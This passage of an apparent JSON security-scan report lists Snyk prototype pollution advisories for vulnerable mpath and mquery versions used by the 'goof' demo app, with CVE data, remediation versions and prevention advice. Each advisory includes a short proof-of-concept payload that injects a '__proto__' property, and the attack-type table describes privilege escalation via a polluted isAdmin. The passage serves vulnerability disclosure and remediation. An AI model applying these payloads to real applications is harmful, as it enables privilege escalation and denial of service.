few methods by which Prototype Pollution can be manipulated:\n\n| Type |Origin  |Short description |\n|--|--|--|\n| **Denial of service (DoS)**|Client  |This is the most likely attack. <br>DoS occurs when `Object` holds generic functions that are implicitly called for various operations (for example, `toString` and `valueOf`). <br> The attacker pollutes `Object.prototype.someattr` and alters its state to an unexpected value such as `Int` or `Object`. In this case, the code fails and is likely to cause a denial of service.  <br>**For example:** if an attacker pollutes `Object.prototype.toString` by defining it as an integer, if the codebase at any point was reliant on `someobject.toString()` it would fail. |\n |**Remote Code Execution**|Client|Remote code execution is generally only possible in cases where the codebase evaluates a specific attribute of an object, and then executes that evaluation.<br>**For example:** `eval(someobject.someattr)`. In this case, if the attacker pollutes `Object.prototype.someattr` they are likely to be able to leverage this in order to execute code.|\n|**Property Injection**|Client|The attacker pollutes properties that the codebase relies on for their informative value, including security properties such as cookies or tokens.<br>  **For example:** if a codebase checks privileges for `someuser.isAdmin`, then when the attacker pollutes `Object.prototype.isAdmin` and sets it to equal `true`, they can then achieve admin privileges.|\n\n## Affected environments\n\nThe following environments are susceptible to a Prototype Pollution attack:\n\n-   Application server\n    \n-   Web server\n    \n\n## How to prevent\n\n1.  Freeze the prototype— use `Object.freeze (Object.prototype)`.\n    \n2.  Require schema validation of JSON input.\n    \n3.  Avoid using unsafe recursive merge functions.\n    \n4.  Consider using objects without prototypes (for example, `Object.create(null)`), breaking the prototype chain and preventing pollution.\n    \n5.  As a best practice use `Map` instead of `Object`.\n\n### For more information on this vulnerability type:\n\n[Arteau, Oliver. “JavaScript prototype pollution attack in NodeJS application.” GitHub, 26 May 2018](https://github.com/HoLyVieR/prototype-pollution-nsec18/blob/master/paper/JavaScript_prototype_pollution_attack_in_NodeJS.pdf)\n\n## Remediation\nUpgrade `mpath` to version 0.8.4 or higher.\n## References\n- [GitHub Commit](https://github.com/aheckmann/mpath/commit/89402d2880d4ea3518480a8c9847c541f2d824fc)\n- [Snyk Blog](https://snyk.io/blog/remediate-javascript-type-confusion-bypassed-input-validation/)\n",
          "impact": 0.5,
          "code": "{\n  \"CVSSv3\": \"CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:L/A:L/E:P/RL:O/RC:C\",\n  \"alternativeIds\": [],\n  \"creationTime\": \"2021-08-31T17:55:54.822005Z\",\n  \"credit\": [\n    \"Alessio Della Libera of Snyk Research Team\"\n  ],\n  \"cvssScore\": 5.6,\n  \"description\": \"## Overview\\n[mpath](https://www.npmjs.com/package/mpath) is a package that gets/sets javascript object values using MongoDB-like path notation.\\n\\nAffected versions of this package are vulnerable to Prototype Pollution. A type confusion vulnerability can lead to a bypass of CVE-2018-16490. In particular, the condition `ignoreProperties.indexOf(parts[i]) !== -1` returns `-1` if `parts[i]` is `['__proto__']`. This is because the method that has been called if the input is an array is `Array.prototype.indexOf()` and not `String.prototype.indexOf()`. They behave differently depending on the type of the input.\\r\\n\\r\\n### PoC\\r\\n```\\r\\nconst mpath = require('mpath');\\r\\n// mpath.set(['__proto__', 'polluted'], 'yes', {});\\r\\n// console.log(polluted); // ReferenceError: polluted is not defined\\r\\n\\r\\nmpath.set([['__proto__'], 'polluted'], 'yes', {});\\r\\nconsole.log(polluted); // yes\\r\\n```\\n\\n## Details\\n\\nPrototype Pollution is a vulnerability affecting JavaScript. Prototype Pollution refers to the ability to inject properties into existing JavaScript language construct prototypes, such as objects. JavaScript allows all Object attributes to be altered, including their magical attributes such as `_proto_`, `constructor` and `prototype`. An attacker manipulates these attributes to overwrite, or pollute, a JavaScript application object prototype of the base object by injecting other values.  Properties on the `Object.prototype` are then inherited by all the JavaScript objects through the prototype chain. When that happens, this leads to either denial of service by triggering JavaScript exceptions, or it tampers with the application source code to force the code path that the attacker injects, thereby leading to remote code execution.\\n\\nThere are two main ways in which the pollution of prototypes occurs:\\n\\n-   Unsafe `Object` recursive merge\\n    \\n-   Property definition by path\\n    \\n\\n### Unsafe Object recursive merge\\n\\nThe logic of a vulnerable recursive merge function follows the following high-level model:\\n```\\nmerge (target, source)\\n\\n  foreach property of source\\n\\n    if property exists and is an object on both the target and the source\\n\\n      merge(target[property], source[property])\\n\\n    else\\n\\n      target[property] = source[property]\\n```\\n<br>  \\n\\nWhen the source object contains a property named `_proto_` defined with `Object.defineProperty()` , the condition that checks if the property exists and is an object on both the target and the source passes and the merge recurses with the target, being the prototype of `Object` and the source of `Object` as defined by the attacker. Properties are then copied on the `Object` prototype.\\n\\nClone operations are a special sub-class of unsafe recursive merges, which occur when a recursive merge is conducted on an empty object: `merge({},source)`.\\n\\n`lodash` and `Hoek` are examples of libraries susceptible to recursive merge attacks.\\n\\n### Property definition by path\\n\\nThere are a few JavaScript libraries that use an API to define property values on an object based on a given path. The function that is generally affected contains this signature: `theFunction(object, path, value)`\\n\\nIf the attacker can control the value of “path”, they can set this value to `_proto_.myValue`. `myValue` is then assigned to the prototype of the class of the object.\\n\\n## Types of attacks\\n\\nThere are a few methods by which Prototype Pollution can be manipulated:\\n\\n| Type |Origin  |Short description |\\n|--|--|--|\\n| **Denial of service (DoS)**|Client  |This is the most likely attack. <br>DoS occurs when `Object` holds generic functions that are implicitly called for various operations (for example, `toString` and `valueOf`). <br> The attacker pollutes `Object.prototype.someattr` and alters its state to an unexpected value such as `Int` or `Object`. In this case, the code fails and is likely to cause a denial of service.  <br>**For example:** if an attacker pollutes `Object.prototype.toString` by defining it as an integer, if the codebase at any point was reliant on `someobject.toString()` it would fail. |\\n |**Remote Code Execution**|Client|Remote code execution is generally only possible in cases where the codebase evaluates a specific attribute of an object, and then executes that evaluation.<br>**For example:** `eval(someobject.someattr)`. In this case, if the attacker pollutes `Object.prototype.someattr` they are likely to be able to leverage this in order to execute code.|\\n|**Property Injection**|Client|The attacker pollutes properties that the codebase relies on for their informative value, including security properties such as cookies or tokens.<br>  **For example:** if a codebase checks privileges for `someuser.isAdmin`, then when the attacker pollutes `Object.prototype.isAdmin` and sets it to equal `true`, they can then achieve admin privileges.|\\n\\n## Affected environments\\n\\nThe following environments are susceptible to a Prototype Pollution attack:\\n\\n-   Application server\\n    \\n-   Web server\\n    \\n\\n## How to prevent\\n\\n1.  Freeze the prototype— use `Object.freeze (Object.prototype)`.\\n    \\n2.  Require schema validation of JSON input.\\n    \\n3.  Avoid using unsafe recursive merge functions.\\n    \\n4.  Consider using objects without prototypes (for example, `Object.create(null)`), breaking the prototype chain and preventing pollution.\\n    \\n5.  As a best practice use `Map` instead of `Object`.\\n\\n### For more information on this vulnerability type:\\n\\n[Arteau, Oliver. “JavaScript prototype pollution attack in NodeJS application.” GitHub, 26 May 2018](https://github.com/HoLyVieR/prototype-pollution-nsec18/blob/master/paper/JavaScript_prototype_pollution_attack_in_NodeJS.pdf)\\n\\n## Remediation\\nUpgrade `mpath` to version 0.8.4 or higher.\\n## References\\n- [GitHub Commit](https://github.com/aheckmann/mpath/commit/89402d2880d4ea3518480a8c9847c541f2d824fc)\\n- [Snyk Blog](https://snyk.io/blog/remediate-javascript-type-confusion-bypassed-input-validation/)\\n\",\n  \"disclosureTime\": \"2021-08-31T17:53:55Z\",\n  \"exploit\": \"Proof of Concept\",\n  \"fixedIn\": [\n    \"0.8.4\"\n  ],\n  \"functions\": [],\n  \"functions_new\": [],\n  \"id\": \"SNYK-JS-MPATH-1577289\",\n  \"identifiers\": {\n    \"CVE\": [\n      \"CVE-2021-23438\"\n    ],\n    \"CWE\": [\n      \"CWE-1321\"\n    ]\n  },\n  \"language\": \"js\",\n  \"malicious\": false,\n  \"modificationTime\": \"2021-11-05T14:26:16.092807Z\",\n  \"moduleName\": \"mpath\",\n  \"packageManager\": \"npm\",\n  \"packageName\": \"mpath\",\n  \"patches\": [],\n  \"proprietary\": true,\n  \"publicationTime\": \"2021-09-01T16:28:19Z\",\n  \"references\": [\n    {\n      \"title\": \"GitHub Commit\",\n      \"url\": \"https://github.com/aheckmann/mpath/commit/89402d2880d4ea3518480a8c9847c541f2d824fc\"\n    },\n    {\n      \"title\": \"Snyk Blog\",\n      \"url\": \"https://snyk.io/blog/remediate-javascript-type-confusion-bypassed-input-validation/\"\n    }\n  ],\n  \"semver\": {\n    \"vulnerable\": [\n      \"<0.8.4\"\n    ]\n  },\n  \"severity\": \"medium\",\n  \"socialTrendAlert\": false,\n  \"title\": \"Prototype Pollution\",\n  \"severityWithCritical\": \"medium\",\n  \"from\": [\n    \"goof@1.0.1\",\n    \"mongoose@4.2.4\",\n    \"mpath@0.1.1\"\n  ],\n  \"upgradePath\": [\n    false,\n    \"mongoose@5.13.9\",\n    \"mpath@0.8.4\"\n  ],\n  \"isUpgradable\": true,\n  \"isPatchable\": false,\n  \"name\": \"mpath\",\n  \"version\": \"0.1.1\"\n}",
          "results": [
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , mongoose@4.2.4 , mpath@0.1.1 ]",
              "run_time": 0,
              "start_time": ""
            }
          ]
        },
        {
          "tags": {
            "cci": [
              "CCI-001310"
            ],
            "nist": [
              "SI-10"
            ],
            "cweid": [
              "400"
            ],
            "cveid": [
              "2020-35149"
            ],
            "ghsaid": [
              "45q2-34rf-mr94"
            ]
          },
          "descriptions": [],
          "refs": [],
          "source_location": {},
          "title": "Prototype Pollution",
          "id": "SNYK-JS-MQUERY-1050858",
          "desc": "## Overview\n[mquery](https://www.npmjs.org/package/mquery) is an Expressive query building for MongoDB\n\nAffected versions of this package are vulnerable to Prototype Pollution via the `merge` function within `lib/utils.js`.  Depending on if user input is provided, an attacker can overwrite and pollute the object prototype of a program. \r\n\r\n\r\n### PoC\r\n```\r\n   require('./env').getCollection(function(err, collection) {\r\n      assert.ifError(err);\r\n      col = collection;\r\n      done();\r\n    });\r\n    var payload = JSON.parse('{\"__proto__\": {\"polluted\": \"vulnerable\"}}');\r\n    var m = mquery(payload);\r\n    console.log({}.polluted);\r\n// The empty object {} will have a property called polluted which will print vulnerable\r\n```\n\n## Details\n\nPrototype Pollution is a vulnerability affecting JavaScript. Prototype Pollution refers to the ability to inject properties into existing JavaScript language construct prototypes, such as objects. JavaScript allows all Object attributes to be altered, including their magical attributes such as `_proto_`, `constructor` and `prototype`. An attacker manipulates these attributes to overwrite, or pollute, a JavaScript application object prototype of the base object by injecting other values.  Properties on the `Object.prototype` are then inherited by all the JavaScript objects through the prototype chain. When that happens, this leads to either denial of service by triggering JavaScript exceptions, or it tampers with the application source code to force the code path that the attacker injects, thereby leading to remote code execution.\n\nThere are two main ways in which the pollution of prototypes occurs:\n\n-   Unsafe `Object` recursive merge\n    \n-   Property definition by path\n    \n\n### Unsafe Object recursive merge\n\nThe logic of a vulnerable recursive merge function follows the following high-level model:\n```\nmerge (target, source)\n\n  foreach property of source\n\n    if property exists and is an object on both the target and the source\n\n      merge(target[property], source[property])\n\n    else\n\n      target[property] = source[property]\n```\n<br>  \n\nWhen the source object contains a property named `_proto_` defined with `Object.defineProperty()` , the condition that checks if the property exists and is an object on both the target and the source passes and the merge recurses with the target, being the prototype of `Object` and the source of `Object` as defined by the attacker. Properties are then copied on the `Object` prototype.\n\nClone operations are a special sub-class of unsafe recursive merges, which occur when a recursive merge is conducted on an empty object: `merge({},source)`.\n\n`lodash` and `Hoek` are examples of libraries susceptible to recursive merge attacks.\n\n### Property definition by path\n\nThere are a few JavaScript libraries that use an API to define property values on an object based on a given path. The function that is generally affected contains this signature: `theFunction(object, path, value)`\n\nIf the attacker can control the value of “path”, they can set this value to `_proto_.myValue`. `myValue` is then assigned to the prototype of the class of the object.\n\n## Types of attacks\n\nThere are a few methods by which Prototype Pollution can be manipulated:\n\n| Type |Origin  |Short description |\n|--|--|--|\n| **Denial of service (DoS)**|Client  |This is the most likely attack. <br>DoS occurs when `Object` holds generic functions that are implicitly called for various operations (for example, `toString` and `valueOf`). <br> The attacker pollutes `Object.prototype.someattr` and alters its state to an unexpected value such as `Int` or `Object`. In this case, the code fails and is likely to cause a denial of service.  <br>**For example:** if an attacker pollutes `Object.prototype.toString` by defining it as an integer, if the codebase at any point was reliant on `someobject.toString()` it would fail. |\n |**Remote Code Execution**|Client|Remote code execution is generally only possible in cases where the codebase evaluates a specific attribute of an object, and then executes that evaluation.<br>**For example:** `eval(someobject.someattr)`. In this case, if the attacker pollutes `Object.prototype.someattr` they are likely to be able to leverage this in order to execute code.|\n|**Property Injection**|Client|The attacker pollutes properties that the codebase relies on for their informative value, including security properties such as cookies or tokens.<br>  **For example:** if a codebase checks privileges for `someuser.isAdmin`, then when the attacker pollutes `Object.prototype.isAdmin` and sets it to equal `true`, they can then achieve admin privileges.|\n\n## Affected environments\n\nThe following environments are susceptible to a Prototype Pollution attack:\n\n-   Application server\n    \n-   Web server\n    \n\n## How to prevent\n\n1.  Freeze the prototype— use `Object.freeze (Object.prototype)`.\n    \n2.  Require schema validation of JSON input.\n    \n3.  Avoid using unsafe recursive merge functions.\n    \n4.  Consider using objects without prototypes (for example, `Object.create(null)`), breaking the prototype chain and preventing pollution.\n    \n5.  As a best practice use `Map` instead of `Object`.\n\n### For more information on this vulnerability type:\n\n[Arteau, Oliver. “JavaScript prototype pollution attack in NodeJS application.” GitHub, 26 May 2018](https://github.com/HoLyVieR/prototype-pollution-nsec18/blob/master/paper/JavaScript_prototype_pollution_attack_in_NodeJS.pdf)\n\n## Remediation\nUpgrade `mquery` to version 3.2.3 or higher.\n## References\n- [mquery GitHub Commit](https://github.com/aheckmann/mquery/commit/792e69fd0a7281a0300be5cade5a6d7c1d468ad4)\n- [rxdb GitHub Commit](https://github.com/pubkey/rxdb/commit/b72ea7789ed61649ed05926bd6bac6d2bb6662d6)\n",
          "impact": 0.7,
          "code": "{\n  \"CVSSv3\": \"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L/E:P\",\n  \"alternativeIds\": [],\n  \"creationTime\": \"2020-12-13T10:38:43.936924Z\",\n  \"credit\": [\n    \"Sam Sanoop of Snyk Security Team\"\n  ],\n  \"cvssScore\": 7.3,\n  \"description\": \"## Overview\\n[mquery](https://www.npmjs.org/package/mquery) is an Expressive query building for MongoDB\\n\\nAffected versions of this package are vulnerable to Prototype Pollution via the `merge` function within `lib/utils.js`.  Depending on if user input is provided, an attacker can overwrite and pollute the object prototype of a program. \\r\\n\\r\\n\\r\\n### PoC\\r\\n```\\r\\n   require('./env').getCollection(function(err, collection) {\\r\\n      assert.ifError(err);\\r\\n      col = collection;\\r\\n      done();\\r\\n    });\\r\\n    var payload = JSON.parse('{\\\"__proto__\\\": {\\\"polluted\\\": \\\"vulnerable\\\"}}');\\r\\n    var m = mquery(payload);\\r\\n    console.log({}.polluted);\\r\\n// The empty object {} will have a property called polluted which will print vulnerable\\r\\n```\\n\\n## Details\\n\\nPrototype Pollution is a vulnerability affecting JavaScript. Prototype Pollution refers to the ability to inject properties into existing JavaScript language construct prototypes, such as objects. JavaScript allows all Object attributes to be altered, including their magical attributes such as `_proto_`, `constructor` and `prototype`. An attacker manipulates these attributes to overwrite, or pollute, a JavaScript application object prototype of the base object by injecting other values.  Properties on the `Object.prototype` are then inherited by all the JavaScript objects through the prototype chain. When that happens, this leads to either denial of service by triggering JavaScript exceptions, or it tampers with the application source code to force the code path that the attacker injects, thereby leading to remote code execution.\\n\\nThere are two main ways in which the pollution of prototypes occurs:\\n\\n-   Unsafe `Object` recursive merge\\n    \\n-   Property definition by path\\n    \\n\\n### Unsafe Object recursive merge\\n\\nThe logic of a vulnerable recursive merge function follows the following high-level model:\\n```\\nmerge (target, source)\\n\\n  foreach property of source\\n\\n    if property exists and is an object on both the target and the source\\n\\n      merge(target[property], source[property])\\n\\n    else\\n\\n      target[property] = source[property]\\n```\\n<br>  \\n\\nWhen the source object contains a property named `_proto_` defined with `Object.defineProperty()` , the condition that checks if the property exists and is an object on both the target and the source passes and the merge recurses with the target, being the prototype of `Object` and the source of `Object` as defined by the attacker. Properties are then copied on the `Object` prototype.\\n\\nClone operations are a special sub-class of unsafe recursive merges, which occur when a recursive merge is conducted on an empty object: `merge({},source)`.\\n\\n`lodash` and `Hoek` are examples of libraries susceptible to recursive merge attacks.\\n\\n### Property definition by path\\n\\nThere are a few JavaScript libraries that use an API to define property values on an object based on a given path. The function that is generally affected contains this signature: `theFunction(object, path, value)`\\n\\nIf the attacker can control the value of “path”, they can set this value to `_proto_.myValue`. `myValue` is then assigned to the prototype of the class of the object.\\n\\n## Types of attacks\\n\\nThere are a few methods by which Prototype Pollution can be manipulated:\\n\\n| Type |Origin  |Short description |\\n|--|--|--|\\n| **Denial of service (DoS)**|Client  |This is the most likely attack. <br>DoS occurs when `Object` holds generic functions that are implicitly called for various operations (for example, `toString` and `valueOf`). <br> The attacker pollutes `Object.prototype.someattr` and alters its state to an unexpected value such as `Int` or `Object`. In this case, the code fails and is likely to cause a denial of service.  <br>**For example:** if an attacker pollutes `Object.prototype.toString` by defining it as an integer, if the codebase at any point was reliant on `someobject.toString()` it would fail. |\\n |**Remote Code Execution**|Client|Remote code execution is generally only possible in cases where the codebase evaluates a specific attribute of an object, and then executes that evaluation.<br>**For example:** `eval(someobject.someattr)`. In this case, if the attacker pollutes `Object.prototype.someattr` they are likely to be able to leverage this in order to execute code.|\\n|**Property Injection**|Client|The attacker pollutes properties that the codebase relies on for their informative value, including security properties such as cookies or tokens.<br>  **For example:** if a codebase checks privileges for `someuser.isAdmin`, then when the attacker pollutes `Object.prototype.isAdmin` and sets it to equal `true`, they can then achieve admin privileges.|\\n\\n## Affected environments\\n\\nThe following environments are susceptible to a Prototype Pollution attack:\\n\\n-   Application server\\n    \\n-   Web server\\n    \\n\\n## How to prevent\\n\\n1.  Freeze the prototype— use `Object.freeze (Object.prototype)`.\\n    \\n2.  Require schema validation of JSON input.\\n    \\n3.  Avoid using unsafe recursive merge functions.\\n    \\n4.  Consider using objects without prototypes (for example, `Object.create(null)`), breaking the prototype chain and preventing pollution.\\n    \\n5.  As a best practice use `Map` instead of `Object`.\\n\\n### For more information on this vulnerability type:\\n\\n[Arteau, Oliver. “JavaScript prototype pollution attack in NodeJS application.” GitHub, 26 May 2018](https://github.com/HoLyVieR/prototype-pollution-nsec18/blob/master/paper/JavaScript_prototype_pollution_attack_in_NodeJS.pdf)\\n\\n## Remediation\\nUpgrade `mquery` to version 3.2.3 or higher.\\n## References\\n- [mquery GitHub Commit](https://github.com/aheckmann/mquery/commit/792e69fd0a7281a0300be5cade5a6d7c1d468ad4)\\n- [rxdb GitHub Commit](https://github.com/pubkey/rxdb/commit/b72ea7789ed61649ed05926bd6bac6d2bb6662d6)\\n\",\n  \"disclosureTime\": \"2020-12-13T10:36:01Z\",\n  \"exploit\": \"Proof of Concept\",\n  \"fixedIn\": [\n    \"3.2.3\"\n  ],\n  \"functions\": [],\n  \"functions_new\": [],\n  \"id\": \"SNYK-JS-MQUERY-1050858\",\n  \"identifiers\": {\n    \"CVE\": [\n      \"CVE-2020-35149\"\n    ],\n    \"CWE\": [\n      \"CWE-400\"\n    ],\n    \"GHSA\": [\n      \"GHSA-45q2-34rf-mr94\"\n    ]\n  },\n  \"language\": \"js\",\n  \"malicious\": false,\n  \"modificationTime\": \"2021-09-07T14:35:39.646982Z\",\n  \"moduleName\": \"mquery\",\n  \"packageManager\": \"npm\",\n  \"packageName\": \"mquery\",\n  \"patches\": [],\n  \"proprietary\": true,\n  \"publicationTime\": \"2020-12-13T15:57:48Z\",\n  \"references\": [\n    {\n      \"title\": \"mquery GitHub Commit\",\n      \"url\": \"https://github.com/aheckmann/mquery/commit/792e69fd0a7281a0300be5cade5a6d7c1d468ad4\"\n    },\n    {\n      \"title\": \"rxdb GitHub Commit\",\n      \"url\": \"https://github.com/pubkey/rxdb/commit/b72ea7789ed61649ed05926bd6bac6d2bb6662d6\"\n    }\n  ],\n  \"semver\": {\n    \"vulnerable\": [\n      \"<3.2.3\"\n    ]\n  },\n  \"severity\": \"high\",\n  \"socialTrendAlert\": false,\n  \"title\": \"Prototype Pollution\",\n  \"severityWithCritical\": \"high\",\n  \"from\": [\n    \"goof@1.0.1\",\n    \"mongoose@4.2.4\",\n    \"mquery@1.6.3\"\n  ],\n  \"upgradePath\": [\n    false,\n    \"mongoose@5.11.7\",\n    \"mquery@3.2.3\"\n  ],\n  \"isUpgradable\": true,\n  \"isPatchable\": false,\n  \"name\": \"mquery\",\n  \"version\": \"1.6.3\"\n}",
          "results": [
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , mongoose@4.2.4 , mquery@1.6.3 ]",
              "run_time": 0,
              "start_time": ""
            }
          ]
        },
        {
          "tags": {
            "cci": [
              "CCI-003173",
              "CCI-001643"
            ],
            "nist": [
              "SA-11",
              "RA-5"
            ],
            "cweid": [
              "1321"
            ],
            "cveid": [],
            "ghsaid": []
          },
          "descriptions": [],
          "refs": [],
          "source_location": {},
          "title": "Prototype Pollution",
          "id": "SNYK-JS-MQUERY-1089718",
          "desc": "## Overview\n[mquery](https://www.npmjs.org/package/mquery) is an Expressive query building for MongoDB\n\nAffected versions of this package are vulnerable to Prototype Pollution via the `mergeClone()` function.\r\n\r\n### PoC by zhou, peng\r\n```\r\nmquery = require('mquery');\r\nvar malicious_payload = '{\"__proto__\":{\"polluted\":\"HACKED\"}}';\r\nconsole.log('Before:', {}.polluted); // undefined\r\nmquery.utils.mergeClone({}, JSON.parse(malicious_payload));\r\nconsole.log('After:', {}.polluted); // HACKED\r\n```\n\n## Details\n\nPrototype Pollution is a vulnerability affecting JavaScript. Prototype Pollution refers to the ability to inject properties into existing JavaScript language construct prototypes, such as objects. JavaScript allows all Object attributes to be altered, including their magical attributes such as `_proto_`, `constructor` and `prototype`. An attacker manipulates these attributes to overwrite, or pollute, a JavaScript application object prototype of the base object by injecting other values.  Properties on the `Object.prototype` are then inherited by all the JavaScript objects through the prototype chain. When that happens, this leads to either denial of service by triggering JavaScript exceptions, or it tampers with the application source code to force the code path that the attacker injects, thereby leading to remote code execution.\n\nThere are two main ways in which the pollution of prototypes occurs:\n\n-   Unsafe `Object` recursive merge\n    \n-   Property definition by path\n    \n\n### Unsafe Object recursive merge\n\nThe logic of a vulnerable recursive merge function follows the following high-level model:\n```\nmerge (target, source)\n\n  foreach property of source\n\n    if property exists and is an object on both the target and the source\n\n      merge(target[property], source[property])\n\n    else\n\n      target[property] = source[property]\n```\n<br>  \n\nWhen the source object contains a property named `_proto_` defined with `Object.defineProperty()` , the condition that checks if the property exists and is an object on both the target and the source passes and the merge recurses with the target, being the prototype of `Object` and the source of `Object` as defined by the attacker. Properties are then copied on the `Object` prototype.\n\nClone operations are a special sub-class of unsafe recursive merges, which occur when a recursive merge is conducted on an empty object: `merge({},source)`.\n\n`lodash` and `Hoek` are examples of libraries susceptible to recursive merge attacks.\n\n### Property definition by path\n\nThere are a few JavaScript libraries that use an API to define property values on an object based on a given path. The function that is generally affected contains this signature: `theFunction(object, path, value)`\n\nIf the attacker can control the value of “path”, they can set this value to `_proto_.myValue`. `myValue` is then assigned to the prototype of the class of the object.\n\n## Types of attacks\n\nThere are a few methods by which Prototype Pollution can be manipulated:\n\n| Type |Origin  |Short description |\n|--|--|--|\n| **Denial of service (DoS)**|Client  |This is the most likely attack. <br>DoS occurs when `Object` holds generic functions that are implicitly called for various operations (for example, `toString` and `valueOf`). <br> The attacker pollutes `Object.prototype.someattr` and alters its state to an unexpected value such as `Int` or `Object`. In this case, the code fails and is likely to cause a denial of service.  <br>**For example:** if an attacker pollutes `Object.prototype.toString` by defining it as an integer, if the codebase at any point was reliant on `someobject.toString()` it would fail. |\n |**Remote Code Execution**|Client|Remote code execution is generally only possible in cases where the codebase evaluates a specific attribute of an object, and then executes that evaluation.<br>**For example:** `eval(someobject.someattr)`. In this case, if the attacker pollutes `Object.prototype.someattr` they are likely to be able to leverage this in order to execute code.|\n|**Property Injection**|Client|The attacker pollutes properties that the codebase relies on for their informative value, including security properties such as cookies or tokens.<br>  **For example:** if a codebase checks privileges for `someuser.isAdmin`, then when the attacker pollutes `Object.prototype.isAdmin` and sets it to equal `true`, they can then achieve admin privileges.|\n\n## Affected environments\n\nThe following environments are susceptible to a Prototype Pollution attack:\n\n-   Application server\n    \n-   Web server\n    \n\n## How to prevent\n\n1.  Freeze the prototype— use `Object.freeze (Object.prototype)`.\n    \n2.  Require schema validation of JSON input.\n    \n3.  Avoid using unsafe recursive merge functions.\n    \n4.  Consider using objects without prototypes (for example, `Object.create(null)`), breaking the prototype chain and preventing pollution.\n    \n5.  As a best practice use `Map` instead of `Object`.\n\n### For more information on this vulnerability type:\n\n[Arteau, Oliver. “JavaScript prototype pollution attack in NodeJS application.” GitHub, 26 May 2018](https://github.com/HoLyVieR/prototype-pollution-nsec18/blob/master/paper/JavaScript_prototype_pollution_attack_in_NodeJS.pdf)\n\n## Remediation\nUpgrade `mquery` to version 3.2.5 or higher.\n## References\n- [GitHub Commit](https://github.com/aheckmann/mquery/commit/158f059e058579d2d08c2f1380689f5f69336778)\n- [GitHub PR](https://github.com/aheckmann/mquery/pull/121)\n",
          "impact": 0.7,
          "code": "{\n  \"CVSSv3\": \"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P/RL:O\",\n  \"alternativeIds\": [],\n  \"creationTime\": \"2021-03-30T09:55:07.306580Z\",\n  \"credit\": [\n    \"zhou peng (@zpbrent)\"\n  ],\n  \"cvssScore\": 7.5,\n  \"description\": \"## Overview\\n[mquery](https://www.npmjs.org/package/mquery) is an Expressive query building for MongoDB\\n\\nAffected versions of this package are vulnerable to Prototype Pollution via the `mergeClone()` function.\\r\\n\\r\\n### PoC by zhou, peng\\r\\n```\\r\\nmquery = require('mquery');\\r\\nvar malicious_payload = '{\\\"__proto__\\\":{\\\"polluted\\\":\\\"HACKED\\\"}}';\\r\\nconsole.log('Before:', {}.polluted); // undefined\\r\\nmquery.utils.mergeClone({}, JSON.parse(malicious_payload));\\r\\nconsole.log('After:', {}.polluted); // HACKED\\r\\n```\\n\\n## Details\\n\\nPrototype Pollution is a vulnerability affecting JavaScript. Prototype Pollution refers to the ability to inject properties into existing JavaScript language construct prototypes, such as objects. JavaScript allows all Object attributes to be altered, including their magical attributes such as `_proto_`, `constructor` and `prototype`. An attacker manipulates these attributes to overwrite, or pollute, a JavaScript application object prototype of the base object by injecting other values.  Properties on the `Object.prototype` are then inherited by all the JavaScript objects through the prototype chain. When that happens, this leads to either denial of service by triggering JavaScript exceptions, or it tampers with the application source code to force the code path that the attacker injects, thereby leading to remote code execution.\\n\\nThere are two main ways in which the pollution of prototypes occurs:\\n\\n-   Unsafe `Object` recursive merge\\n    \\n-   Property definition by path\\n    \\n\\n### Unsafe Object recursive merge\\n\\nThe logic of a vulnerable recursive merge function follows the following high-level model:\\n```\\nmerge (target, source)\\n\\n  foreach property of source\\n\\n    if property exists and is an object on both the target and the source\\n\\n      merge(target[property], source[property])\\n\\n    else\\n\\n      target[property] = source[property]\\n```\\n<br>  \\n\\nWhen the source object contains a property named `_proto_` defined with `Object.defineProperty()` , the condition that checks if the property exists and is an object on both the target and the source passes and the merge recurses with the target, being the prototype of `Object` and the source of `Object` as defined by the attacker. Properties are then copied on the `Object` prototype.\\n\\nClone operations are a special sub-class of unsafe recursive merges, which occur when a recursive merge is conducted on an empty object: `merge({},source)`.\\n\\n`lodash` and `Hoek` are examples of libraries susceptible to recursive merge attacks.\\n\\n### Property definition by path\\n\\nThere are a few JavaScript libraries that use an API to define property values on an object based on a given path. The function that is generally affected contains this signature: `theFunction(object, path, value)`\\n\\nIf the attacker can control the value of “path”, they can set this value to `_proto_.myValue`. `myValue` is then assigned to the prototype of the class of the object.\\n\\n## Types of attacks\\n\\nThere are a few methods by which Prototype Pollution can be manipulated:\\n\\n| Type |Origin  |Short description |\\n|--|--|--|\\n| **Denial of service (DoS)**|Client  |This is the most likely attack. <br>DoS occurs when `Object` holds generic functions that are implicitly called for various operations (for example, `toString` and `valueOf`). <br> The attacker pollutes `Object.prototype.someattr` and alters its state to an unexpected value such as `Int` or `Object`. In this case, the code fails and is likely to cause a denial of service.  <br>**For example:** if an attacker pollutes `Object.prototype.toString` by defining it as an integer, if the codebase at any point was reliant on `someobject.toString()` it would fail. |\\n |**Remote Code Execution**|Client|Remote code execution is generally only possible in cases where the codebase evaluates a specific attribute of an object, and then executes that evaluation.<br>**For example:** `eval(someobject.someattr)`. In this case, if the attacker pollutes `Object.prototype.someattr` they are likely to be able to leverage this in order to execute code.|\\n|**Property Injection**|Client|The attacker pollutes properties that the codebase relies on for their informative value, including security properties such as cookies or tokens.<br>  **For example:** if a codebase checks privileges for `someuser.isAdmin`, then when the attacker pollutes `Object.prototype.isAdmin` and sets it to equal `true`, they can then achieve admin privileges.|\\n\\n## Affected environments\\n\\nThe following environments are susceptible to a Prototype Pollution attack:\\n\\n-   Application server\\n    \\n-   Web server\\n    \\n\\n## How to prevent\\n\\n1.  Freeze the prototype— use `Object.freeze (Object.prototype)`.\\n    \\n2.  Require schema validation of JSON input.\\n    \\n3.  Avoid using unsafe recursive merge functions.\\n    \\n4.  Consider using objects without prototypes (for example, `Object.create(null)`), breaking the prototype chain and preventing pollution.\\n    \\n5.  As a best practice use `Map` instead of `Object`.\\n\\n### For more information on this vulnerability type:\\n\\n[Arteau, Oliver. “JavaScript prototype pollution attack in NodeJS application.” GitHub, 26 May 2018](https://github.com/HoLyVieR/prototype-pollution-nsec18/blob/master/paper/JavaScript_prototype_pollution_attack_in_NodeJS.pdf)\\n\\n## Remediation\\nUpgrade `mquery` to version 3.2.5 or higher.\\n## References\\n- [GitHub Commit](https://github.com/aheckmann/mquery/commit/158f059e058579d2d08c2f1380689f5f69336778)\\n- [GitHub PR](https://github.com/aheckmann/mquery/pull/121)\\n\",\n  \"disclosureTime\": 